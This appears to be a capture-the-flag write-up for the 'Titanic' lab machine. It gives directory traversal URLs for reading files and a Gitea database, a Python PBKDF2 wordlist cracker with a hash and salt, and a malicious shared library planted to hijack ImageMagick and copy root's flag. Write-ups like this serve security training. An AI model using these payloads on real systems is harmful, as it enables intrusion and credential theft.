# Titanic

```
Difficulty: Easy
Operating System: Linux
Hints: True
```
##  Summary

| Step | User / Access | Technique Used                          | Result                                                                                                       |
| :--- | :------------ | :-------------------------------------- | :----------------------------------------------------------------------------------------------------------- |
| 1    | `N/A`         | **Nmap Scan**                           | Discovered open ports: `22` (SSH) and `80` (HTTP).                                                           |
| 2    | `N/A`         | **Directory Traversal**                 | Accessed `user.txt` by manipulating `ticket` parameter: `../../../../../../../home/developer/user.txt`.      |
| 3    | `N/A`         | **Subdomain Enumeration**               | Discovered `dev.titanic.htb`, identified as Gitea 1.22.1.                                                    |
| 4    | `N/A`         | **Gitea Database Leak**                 | Downloaded `gitea.db` via directory traversal: `../../../../../../home/developer/gitea/data/gitea/gitea.db`. |
| 5    | `developer`   | **Password Cracking (pbkdf2)**          | Extracted and cracked developer password hash using a custom Python script.                                  |
| 6    | `developer`   | **User Shell Access**                   | Logged in as `developer` and retrieved `user.txt`.                                                           |
| 7    | `root`        | **ImageMagick Exploit (CVE-2024-xxxx)** | Created malicious `libxcb.so.1` to execute code during image processing, exfiltrating `root.txt`.            |


##  Step 1 – Initial Enumeration

**Nmap Scan:**

```bash
nmap -sV -T4 titanic.htb
````

**Result:**

```
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp  open  http    Apache httpd 2.4.52
```

* Port 80 serves a web application.

---

##  Step 2 – File Read (Directory Traversal)

Visited `http://titanic.htb` and clicked **Book Now**.

Used **Burp Suite** to intercept the HTTP request and found a file download mechanism with a `ticket` parameter.

### Exploit Directory Traversal:

```http
http://titanic.htb/download?ticket=../../../../../../../home/developer/user.txt
```

**Result:**

* Successfully downloaded and read `user.txt`.

---

##  Step 3 – Subdomain Fuzzing

Added entry to `/etc/hosts`:

```
10.10.x.x dev.titanic.htb
```

Visited `http://dev.titanic.htb` → Found a **Gitea service (version 1.22.1)**.

---

##  Step 4 – Gitea Database Download

Knowing Gitea's database is usually located at `/data/gitea.db`, used directory traversal again:

```http
http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db
```

* Successfully obtained `gitea.db`.

---

##  Step 5 – Crack Developer Password

Extracted password hash from the database:
`e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`

Salt: `8bf3e3452b78544f8bee9400d6936d34`

Used a custom Python script to brute-force using the wordlist:

```python
import hashlib
import binascii

def pbkdf2_hash(password, salt, iterations=50000, dklen=50):
    hash_value = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        iterations,
        dklen
    )
    return hash_value

def find_matching_password(dictionary_file, target_hash, salt):
    target_hash_bytes = binascii.unhexlify(target_hash)
    with open(dictionary_file, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()
            hash_value = pbkdf2_hash(password, salt)
            if hash_value == target_hash_bytes:
                print(f"Found password: {password}")
                return password
    return None

salt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')
target_hash = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'
dictionary_file = '/usr/share/wordlists/rockyou.txt'
find_matching_password(dictionary_file, target_hash, salt)
```

**Result:** Found the developer's password.

---

##  Step 6 – Login as Developer

```bash
ssh developer@titanic.htb
```

Located `user.txt` at `/home/developer/user.txt` and retrieved it.

---

##  Step 7 – Privilege Escalation via ImageMagick (CVE)

In `/opt/scripts/identify_image.sh`, identified that `libxcb.so.1` could be exploited.

### Exploit Path:

```bash
cd /opt/app/static/assets/images

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/rootflag");
    exit(0);
}
EOF
```

Also needed to copy a dummy image:

```bash
cp home.jpg home2.jpg
```

Waited for the script to execute, which read and exfiltrated the root flag to `/tmp/rootflag`.

Finally retrieved:

```bash
cat /tmp/rootflag
```

---

